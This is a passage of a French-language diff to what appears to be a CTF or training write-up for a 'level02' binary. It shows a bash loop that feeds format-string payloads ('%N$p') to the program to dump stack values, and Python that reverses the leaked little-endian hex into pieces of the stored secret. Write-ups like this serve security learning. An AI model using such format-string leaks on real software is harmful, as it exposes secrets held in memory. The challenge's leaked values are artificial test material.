@@ -13,4 +13,32 @@ On peut donc afficher toutes les premieres adresses de la stack avec le script b
 Nous remarquons que seul quelques adresse a la suite sont remplies.
 On cherche les 5 a la suite du buffer, car 5 * 8 octets = 40 (la taille du buffer sans le null byte de fin)
 
-On peut donc les decoder de hexa vers ascii, en inversant chaque byte du au little endian
+On peut donc les decoder de hexa vers ascii, en inversant chaque byte du au little endian, puis assembler le tout.
+```bash
+$ for((i=1;i<42;++i)); do echo "$i/%$i\$p" | ./level02 | grep does; done;
+1/0x7fffffffe470 does not have access!
+2/(nil) does not have access!
+...
+22/0x756e505234376848 does not have access!
+23/0x45414a3561733951 does not have access!
+24/0x377a7143574e6758 does not have access!
+25/0x354a35686e475873 does not have access!
+26/0x48336750664b394d does not have access!
+...
+38/(nil) does not have access!
+39/(nil) does not have access!
+40/0x2900000000 does not have access!
+41/0x602010 does not have access!
+
+$ python
+>>> bytes.fromhex("756e505234376848")[::-1]
+b'Hh74RPnu'
+>>> bytes.fromhex("45414a3561733951")[::-1]
+b'Q9sa5JAE'
+>>> bytes.fromhex("377a7143574e6758")[::-1]
+b'XgNWCqz7'
+>>> bytes.fromhex("354a35686e475873")[::-1]
+b'sXGnh5J5'
+>>> bytes.fromhex("48336750664b394d")[::-1]
+b'M9KfPg3H'
+```
